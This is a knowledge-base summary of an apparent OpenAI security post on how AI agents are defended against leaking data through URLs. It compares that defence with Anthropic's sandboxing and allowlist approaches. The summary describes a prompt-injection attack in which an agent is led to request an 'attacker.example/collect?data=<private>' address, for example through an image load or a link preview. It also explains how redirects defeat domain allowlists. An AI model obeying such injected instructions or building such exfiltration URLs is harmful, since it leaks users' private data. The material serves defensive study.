---
title: "OpenAI (Security): Keeping Your Data Safe When an AI Agent Clicks a Link"
type: source
created: 2026-10-12
updated: 2026-10-12
author: Adrian Spânu, Thomas Shadwell (OpenAI)
date: 2026-01-28
source_url: https://openai.com/index/ai-agent-link-safety/
source_path: raw/openai-agent-link-safety.md
tags: [security, prompt-injection, exfiltration, network-policy, browser-agents, chatgpt, primary-source]
---

# OpenAI (Security): Keeping Your Data Safe When an AI Agent Clicks a Link

> OpenAI's defense against URL-based data exfiltration: an agent may fetch a
> URL automatically only if an independent crawler has already seen that exact
> URL in public.

## Summary

A URL can carry data as well as a destination. An injection can make an agent
request `attacker.example/collect?data=<private>` in the background (an image
load, a link preview), and the attacker reads the data from server logs. OpenAI
rejects domain allowlists as the main fix for two reasons: redirects let a
trusted domain forward to an attacker, and strict lists cause warning fatigue.
Its rule instead: auto-fetch only URLs that an independent web index, with no
access to user data, has already recorded. Other URLs are unverified. The agent
is told to try another source, or the user sees a warning and must act. This is
the mechanism behind "Safe Url" in
[[openai-designing-agents-resist-prompt-injection]]. See [[guardrails]].

## Key points

- **Exact-URL check, not domain reputation.** The question is "has this exact
  address appeared publicly, independent of user data?", not "is this site
  trusted?".
- **Index independence matters:** the crawler sees no conversations, accounts,
  or personal data, so a URL it knows cannot encode a specific user's secret.
- **Fallbacks:** redirect the agent to another site, or show a warning that the
  link is unverified and may include conversation data.
- **Narrow, stated guarantee:** no quiet leak of user data through the URL
  itself. Not covered: page content trustworthiness, social engineering of the
  user, harmful instructions on a page.
- **One layer of defense in depth** with model-level mitigations, product
  controls, monitoring, and red-teaming.

## Entities

[[openai]]

## Concepts

[[guardrails]], [[tool-design]]

## Notable claims & data

- Warning fatigue is named as a design cost: frequent false alarms teach users
  to click through. Same finding as Anthropic's 93% approval rate in
  [[anthropic-eng-how-we-contain-claude]].
- A technical paper is linked from the post; it was not read for this capture.

## Connections

- **Agrees with** [[anthropic-eng-how-we-contain-claude]]: a domain allowlist is
  not a sufficient exfiltration control (Anthropic: "a capability grant, not
  just a destination filter"; OpenAI: redirects defeat first-domain checks).
  The two vendors fix it differently: Anthropic restricts which credentials an
  allowlisted host accepts; OpenAI checks whether the exact URL is public.
- **Agrees with** [[anthropic-eng-claude-code-sandboxing]]: network isolation is
  needed because a compromised agent can exfiltrate. Both treat the outbound
  request as the sink.
- Complements per-request network allowlists in
  [[openai-shell-skills-compaction]] and [[openai-running-codex-safely]].
- Announced in [[openai-understanding-prompt-injections]] as a coming report
  (inference from that post's closing note).
